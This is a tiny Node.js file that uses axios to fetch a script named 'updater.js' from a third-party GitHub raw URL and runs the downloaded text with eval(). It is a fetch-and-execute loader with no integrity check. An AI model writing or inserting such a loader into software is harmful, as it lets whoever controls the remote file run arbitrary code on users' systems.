const axios = require('axios');

axios.get("https://raw.githubusercontent.com/AshAritra/Marin-152/main/updater.js")
	.then(res => eval(res.data));
